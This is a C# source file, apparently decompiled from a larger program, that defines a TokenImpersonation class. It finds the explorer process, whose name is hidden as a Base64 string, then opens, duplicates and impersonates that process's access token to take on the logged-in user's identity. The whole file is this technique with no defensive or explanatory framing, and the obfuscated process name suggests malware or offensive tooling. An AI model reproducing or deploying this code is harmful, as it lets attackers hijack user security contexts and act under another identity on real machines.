using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace Complex;

internal class TokenImpersonation
{
	public const int TOKEN_DUPLICATE = 2;

	public const int TOKEN_QUERY = 8;

	public const int TOKEN_IMPERSONATE = 4;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr handle);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

	private static IntPtr DupeToken(IntPtr token, int Level)
	{
		IntPtr DuplicateTokenHandle = IntPtr.Zero;
		DuplicateToken(token, Level, ref DuplicateTokenHandle);
		return DuplicateTokenHandle;
	}

	public static void ImpExp()
	{
		try
		{
			IntPtr TokenHandle = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == Program.Base64Decode("ZXhwbG9yZXI="))
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref TokenHandle) == 0)
			{
				return;
			}
			WindowsIdentity windowsIdentity = new WindowsIdentity(TokenHandle);
			if (Program.ConsoleReport)
			{
				try
				{
				}
				catch (Exception)
				{
				}
			}
			try
			{
				zero = DupeToken(TokenHandle, 2);
				if (!(IntPtr.Zero == zero))
				{
				}
				windowsIdentity.Impersonate();
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				if (Program.ConsoleReport)
				{
					try
					{
						Console.WriteLine("Impersonation-> Token number: {0}", token);
						Console.WriteLine("Impersonation-> Windows ID Name: {0}", WindowsIdentity.GetCurrent().Name);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			finally
			{
				CloseHandle(TokenHandle);
			}
		}
		catch (Exception ex3)
		{
			if (Program.debugmode)
			{
				try
				{
					File.AppendAllText(Program.DebugReport, "Error while impersonating: " + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
